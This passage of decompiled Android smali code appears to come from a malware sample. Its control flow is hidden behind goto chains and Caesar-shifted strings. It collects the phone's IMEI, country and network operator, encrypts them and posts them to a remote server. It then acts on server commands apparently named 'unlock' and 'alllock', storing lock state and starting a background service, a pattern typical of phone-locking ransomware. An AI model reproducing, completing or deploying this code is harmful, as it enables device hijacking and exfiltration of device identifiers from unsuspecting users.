    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_a0

    :goto_a2
    nop

    invoke-interface/range {v28 .. v28}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v15

    nop

    goto :goto_a1

    :goto_a3
    nop

    invoke-virtual/range {v34 .. v36}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v28

    nop

    goto :goto_a2

    :goto_a4
    nop

    const/16 v36, 0x0

    nop

    goto :goto_a3

    :goto_a5
    nop

    const-string v35, "dpdpo"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_a4

    :goto_a6
    nop

    move-object/from16 v34, v0

    nop

    goto :goto_a5

    :goto_a7
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_a6

    :goto_a8
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_a7

    :goto_a9
    nop

    if-eqz v34, :cond_6

    nop

    goto :goto_a8

    :goto_aa
    nop

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v34

    nop

    goto :goto_a9

    :goto_ab
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_aa

    :goto_ac
    nop

    move-object/from16 v0, v27

    nop

    goto :goto_ab

    :cond_7
    :goto_ad
    nop

    const-string v34, "vompdl"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_ac

    :goto_ae
    nop

    invoke-static/range {v34 .. v34}, Landroid/os/Process;->killProcess(I)V

    nop

    goto :goto_ad

    :goto_af
    nop

    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v34

    nop

    goto :goto_ae

    :goto_b0
    nop

    if-ne v0, v1, :cond_7

    nop

    goto :goto_af

    :goto_b1
    nop

    move/from16 v1, v34

    nop

    goto :goto_b0

    :goto_b2
    nop

    move/from16 v0, v32

    nop

    goto :goto_b1

    :goto_b3
    nop

    const/16 v34, 0x4d

    nop

    goto :goto_b2

    :goto_b4
    nop

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v32

    nop

    goto :goto_b3

    :goto_b5
    nop

    move/from16 v2, v35

    nop

    goto :goto_b4

    :goto_b6
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_b5

    :goto_b7
    nop

    move-object/from16 v0, v29

    nop

    goto :goto_b6

    :goto_b8
    nop

    const/16 v35, 0x0

    nop

    goto :goto_b7

    :goto_b9
    nop

    const-string v34, "tubuvt"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_b8

    :goto_ba
    nop

    invoke-virtual/range {v34 .. v36}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v29

    nop

    goto :goto_b9

    :goto_bb
    nop

    const/16 v36, 0x0

    nop

    goto :goto_ba

    :goto_bc
    nop

    const-string v35, "dpdpo"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_bb

    :goto_bd
    nop

    move-object/from16 v34, v0

    nop

    goto :goto_bc

    :goto_be
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_bd

    :cond_8
    :goto_bf
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_be

    :goto_c0
    nop

    invoke-virtual/range {v34 .. v35}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    nop

    goto :goto_bf

    :goto_c1
    nop

    invoke-direct/range {v35 .. v37}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    nop

    goto :goto_c0

    :goto_c2
    nop

    const-class v37, Lcom/EDzgPz/KwIOuS/dNuGTM;

    nop

    goto :goto_c1

    :goto_c3
    nop

    move-object/from16 v36, v0

    nop

    goto :goto_c2

    :goto_c4
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_c3

    :goto_c5
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_c4

    :goto_c6
    nop

    new-instance v35, Landroid/content/Intent;

    nop

    goto :goto_c5

    :goto_c7
    nop

    move-object/from16 v34, v0

    nop

    goto :goto_c6

    :goto_c8
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_c7

    :goto_c9
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_c8

    :goto_ca
    nop

    invoke-interface {v15}, Landroid/content/SharedPreferences$Editor;->commit()Z

    nop

    goto :goto_c9

    :goto_cb
    nop

    invoke-interface {v15, v0, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    nop

    goto :goto_ca

    :goto_cc
    nop

    move-object/from16 v1, v35

    nop

    goto :goto_cb

    :goto_cd
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_cc

    :goto_ce
    nop

    const-string v35, ""

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_cd

    :goto_cf
    nop

    const-string v34, "qdpef"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_ce

    :goto_d0
    nop

    invoke-interface {v15, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    nop

    goto :goto_cf

    :goto_d1
    nop

    move/from16 v1, v35

    nop

    goto :goto_d0

    :goto_d2
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_d1

    :goto_d3
    nop

    const/16 v35, 0x0

    nop

    goto :goto_d2

    :goto_d4
    nop

    const-string v34, "bojnbujpo"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_d3

    :goto_d5
    nop

    invoke-interface {v15, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    nop

    goto :goto_d4

    :goto_d6
    nop

    move/from16 v1, v35

    nop

    goto :goto_d5

    :goto_d7
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_d6

    :goto_d8
    nop

    const/16 v35, 0x0

    nop

    goto :goto_d7

    :goto_d9
    nop

    const-string v34, "tubuvt"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_d8

    :goto_da
    nop

    invoke-interface/range {v28 .. v28}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v15

    nop

    goto :goto_d9

    :goto_db
    nop

    invoke-virtual/range {v34 .. v36}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v28

    nop

    goto :goto_da

    :goto_dc
    nop

    const/16 v36, 0x0

    nop

    goto :goto_db

    :goto_dd
    nop

    const-string v35, "dpdpo"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_dc

    :goto_de
    nop

    move-object/from16 v34, v0

    nop

    goto :goto_dd

    :goto_df
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_de

    :goto_e0
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_df

    :goto_e1
    nop

    if-eqz v34, :cond_8

    nop

    goto :goto_e0

    :goto_e2
    nop

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v34

    nop

    goto :goto_e1

    :goto_e3
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_e2

    :goto_e4
    nop

    move-object/from16 v0, v27

    nop

    goto :goto_e3

    :goto_e5
    nop

    const-string v34, "bmmmpdl"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_e4

    :goto_e6
    nop

    if-le v0, v1, :cond_3

    nop

    goto :goto_e5

    :goto_e7
    nop

    move/from16 v1, v35

    nop

    goto :goto_e6

    :goto_e8
    nop

    move/from16 v0, v34

    nop

    goto :goto_e7

    :goto_e9
    nop

    const/16 v35, 0x3

    nop

    goto :goto_e8

    :goto_ea
    nop

    invoke-virtual/range {v27 .. v27}, Ljava/lang/String;->length()I

    move-result v34

    nop

    goto :goto_e9

    :goto_eb
    nop

    check-cast v27, Ljava/lang/String;

    nop

    goto :goto_ea

    :goto_ec
    nop

    invoke-virtual {v0, v1, v2}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;Lorg/apache/http/client/ResponseHandler;)Ljava/lang/Object;

    move-result-object v27

    nop

    goto :goto_eb

    :goto_ed
    nop

    move-object/from16 v2, v26

    nop

    goto :goto_ec

    :goto_ee
    nop

    move-object/from16 v1, v25

    nop

    goto :goto_ed

    :goto_ef
    nop

    move-object/from16 v0, v18

    nop

    goto :goto_ee

    :goto_f0
    nop

    invoke-virtual {v0, v1}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    nop

    goto :goto_ef

    :goto_f1
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_f0

    :goto_f2
    nop

    move-object/from16 v0, v25

    nop

    goto :goto_f1

    :goto_f3
    nop

    invoke-direct {v0, v1}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;)V

    nop

    goto :goto_f2

    :goto_f4
    nop

    move-object/from16 v1, v23

    nop

    goto :goto_f3

    :goto_f5
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_f4

    :goto_f6
    nop

    new-instance v34, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    nop

    goto :goto_f5

    :goto_f7
    nop

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    nop

    goto :goto_f6

    :goto_f8
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_f7

    :goto_f9
    nop

    move-object/from16 v0, v23

    nop

    goto :goto_f8

    :goto_fa
    nop

    invoke-direct {v0, v1, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    nop

    goto :goto_f9

    :goto_fb
    nop

    move-object/from16 v1, v35

    nop

    goto :goto_fa

    :goto_fc
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_fb

    :goto_fd
    nop

    const-string v35, "ebub"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_fc

    :goto_fe
    nop

    new-instance v34, Lorg/apache/http/message/BasicNameValuePair;

    nop

    goto :goto_fd

    :goto_ff
    nop

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    nop

    goto :goto_fe

    :goto_100
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_ff

    :goto_101
    nop

    move-object/from16 v0, v23

    nop

    goto :goto_100

    :goto_102
    nop

    invoke-direct/range {v34 .. v36}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    nop

    goto :goto_101

    :goto_103
    nop

    const-string v36, "9"

    invoke-static/range {v36 .. v36}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v36

    nop

    goto :goto_102

    :goto_104
    nop

    const-string v35, "tvc"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_103

    :goto_105
    nop

    new-instance v34, Lorg/apache/http/message/BasicNameValuePair;

    nop

    goto :goto_104

    :goto_106
    nop

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    nop

    goto :goto_105

    :goto_107
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_106

    :goto_108
    nop

    move-object/from16 v0, v23

    nop

    goto :goto_107

    :goto_109
    nop

    invoke-direct/range {v34 .. v36}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    nop

    goto :goto_108

    :goto_10a
    nop

    aget-object v36, p1, v36

    nop

    goto :goto_109

    :goto_10b
    nop

    const/16 v36, 0x1

    nop

    goto :goto_10a

    :goto_10c
    nop

    const-string v35, "dne"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_10b

    :goto_10d
    nop

    new-instance v34, Lorg/apache/http/message/BasicNameValuePair;

    nop

    goto :goto_10c

    :goto_10e
    nop

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    nop

    goto :goto_10d

    :goto_10f
    nop

    move-object/from16 v1, v35

    nop

    goto :goto_10e

    :goto_110
    nop

    move-object/from16 v0, v23

    nop

    goto :goto_10f

    :goto_111
    nop

    invoke-direct {v0, v1, v2}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    nop

    goto :goto_110

    :goto_112
    nop

    move-object/from16 v2, v34

    nop

    goto :goto_111

    :goto_113
    nop

    move-object/from16 v1, v36

    nop

    goto :goto_112

    :goto_114
    nop

    move-object/from16 v0, v35

    nop

    goto :goto_113

    :goto_115
    nop

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_114

    :goto_116
    nop

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_115

    :goto_117
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_116

    :goto_118
    nop

    move-object/from16 v0, v37

    nop

    goto :goto_117

    :goto_119
    nop

    invoke-virtual/range {v34 .. v34}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_118

    :goto_11a
    nop

    check-cast v34, Landroid/telephony/TelephonyManager;

    nop

    goto :goto_119

    :goto_11b
    nop

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v34

    nop

    goto :goto_11a

    :goto_11c
    nop

    move-object/from16 v1, v38

    nop

    goto :goto_11b

    :goto_11d
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_11c

    :goto_11e
    nop

    const-string v38, "qipof"

    invoke-static/range {v38 .. v38}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v38

    nop

    goto :goto_11d

    :goto_11f
    nop

    move-object/from16 v34, v0

    nop

    goto :goto_11e

    :goto_120
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_11f

    :goto_121
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_120

    :goto_122
    nop

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_121

    :goto_123
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_122

    :goto_124
    nop

    move-object/from16 v0, v37

    nop

    goto :goto_123

    :goto_125
    nop

    const-string v34, "$"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_124

    :goto_126
    nop

    new-instance v37, Ljava/lang/StringBuilder;

    nop

    goto :goto_125

    :goto_127
    nop

    const-string v36, "jnfj"

    invoke-static/range {v36 .. v36}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v36

    nop

    goto :goto_126

    :goto_128
    nop

    new-instance v35, Lorg/apache/http/message/BasicNameValuePair;

    nop

    goto :goto_127

    :goto_129
    nop

    invoke-static {v12, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v6

    nop

    goto :goto_128

    :goto_12a
    nop

    move/from16 v0, v34

    nop

    goto :goto_129
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_12b
    nop

    const/16 v34, 0x0

    nop

    goto :goto_12a

    :goto_12c
    :try_start_1
    nop

    invoke-virtual {v11, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v12

    nop

    goto :goto_12b

    :goto_12d
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_12c

    :goto_12e
    nop

    const-string v34, "VUG.9"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_12d
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :goto_12f
    nop

    const/4 v12, 0x0

    nop

    goto :goto_12e

    :goto_130
    :try_start_2
    nop

    const-string v6, ""

    invoke-static/range {v6 .. v6}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    nop

    goto :goto_12f

    :goto_131
    nop

    invoke-static/range {v34 .. v34}, Lcom/EDzgPz/KwIOuS/JLFPZi;->bytesToHex([B)Ljava/lang/String;

    move-result-object v11

    nop

    goto :goto_130

    :goto_132
    nop

    invoke-virtual {v0, v10}, Lcom/EDzgPz/KwIOuS/JLFPZi;->encrypt(Ljava/lang/String;)[B

    move-result-object v34

    nop

    goto :goto_131

    :goto_133
    nop

    move-object/from16 v0, v22

    nop

    goto :goto_132

    :goto_134
    nop

    invoke-direct/range {v22 .. v22}, Lcom/EDzgPz/KwIOuS/JLFPZi;-><init>()V

    nop

    goto :goto_133

    :goto_135
    nop

    new-instance v22, Lcom/EDzgPz/KwIOuS/JLFPZi;

    nop

    goto :goto_134

    :goto_136
    nop

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_135

    :goto_137
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_136

    :goto_138
    nop

    aget-object v35, p1, v35

    nop

    goto :goto_137

    :goto_139
    nop

    const/16 v35, 0x2

    nop

    goto :goto_138

    :goto_13a
    nop

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_139

    :goto_13b
    nop

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_13a

    :goto_13c
    nop

    new-instance v34, Ljava/lang/StringBuilder;

    nop

    goto :goto_13b

    :goto_13d
    nop

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_13c

    :goto_13e
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_13d

    :goto_13f
    nop

    const-string v35, ";.;"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_13e

    :goto_140
    nop

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_13f

    :goto_141
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_140

    :goto_142
    nop

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_141

    :goto_143
    nop

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_142

    :goto_144
    nop

    new-instance v34, Ljava/lang/StringBuilder;

    nop

    goto :goto_143

    :goto_145
    nop

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_144

    :goto_146
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_145

    :goto_147
    nop

    const-string v35, ";.;"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_146

    :goto_148
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_147

    :goto_149
    nop

    invoke-static {v7}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_148

    :goto_14a
    nop

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_149

    :goto_14b
    nop

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_14a

    :goto_14c
    nop

    new-instance v34, Ljava/lang/StringBuilder;

    nop

    goto :goto_14b

    :goto_14d
    nop

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_14c

    :goto_14e
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_14d

    :goto_14f
    nop

    const-string v35, ";.;"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_14e

    :goto_150
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_14f

    :goto_151
    nop

    invoke-static/range {v31 .. v31}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_150

    :goto_152
    nop

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_151

    :goto_153
    nop

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_152

    :goto_154
    nop

    new-instance v34, Ljava/lang/StringBuilder;

    nop

    goto :goto_153

    :goto_155
    nop

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_154

    :goto_156
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_155

    :goto_157
    nop

    const-string v35, ";.;"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_156

    :goto_158
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_157

    :goto_159
    nop

    invoke-virtual/range {v35 .. v35}, Ljava/util/Locale;->getCountry()Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_158

    :goto_15a
    nop

    move-object/from16 v35, v0

    nop

    goto :goto_159

    :goto_15b
    nop

    iget-object v0, v0, Landroid/content/res/Configuration;->locale:Ljava/util/Locale;

    nop

    goto :goto_15a

    :goto_15c
    nop

    move-object/from16 v0, v35

    nop

    goto :goto_15b

    :goto_15d
    nop

    invoke-virtual/range {v35 .. v35}, Landroid/content/res/Resources;->getConfiguration()Landroid/content/res/Configuration;

    move-result-object v35

    nop

    goto :goto_15c

    :goto_15e
    nop

    invoke-virtual/range {v35 .. v35}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v35

    nop

    goto :goto_15d

    :goto_15f
    nop

    move-object/from16 v35, v0

    nop

    goto :goto_15e

    :goto_160
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_15f

    :goto_161
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_160

    :goto_162
    nop

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_161

    :goto_163
    nop

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_162

    :goto_164
    nop

    new-instance v34, Ljava/lang/StringBuilder;

    nop

    goto :goto_163

    :goto_165
    nop

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_164

    :goto_166
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_165

    :goto_167
    nop

    const-string v35, ";.;"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_166

    :goto_168
    nop

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_167

    :goto_169
    nop

    move-object/from16 v1, v16

    nop

    goto :goto_168

    :goto_16a
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_169

    :goto_16b
    nop

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_16a

    :goto_16c
    nop

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_16b

    :goto_16d
    nop

    new-instance v34, Ljava/lang/StringBuilder;

    nop

    goto :goto_16c

    :goto_16e
    nop

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_16d

    :goto_16f
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_16e

    :goto_170
    nop

    const-string v35, ";.;"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_16f

    :goto_171
    nop

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_170

    :goto_172
    nop

    move-object/from16 v1, v33

    nop

    goto :goto_171

    :goto_173
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_172

    :goto_174
    nop

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_173

    :goto_175
    nop

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_174

    :goto_176
    nop

    new-instance v34, Ljava/lang/StringBuilder;

    nop

    goto :goto_175

    :goto_177
    nop

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_176

    :goto_178
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_177

    :goto_179
    nop

    const-string v35, ";.;"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_178

    :goto_17a
    nop

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_179

    :goto_17b
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_17a

    :goto_17c
    nop

    move-object/from16 v0, v35

    nop

    goto :goto_17b

    :goto_17d
    nop

    invoke-virtual/range {v34 .. v34}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_17c

    :goto_17e
    nop

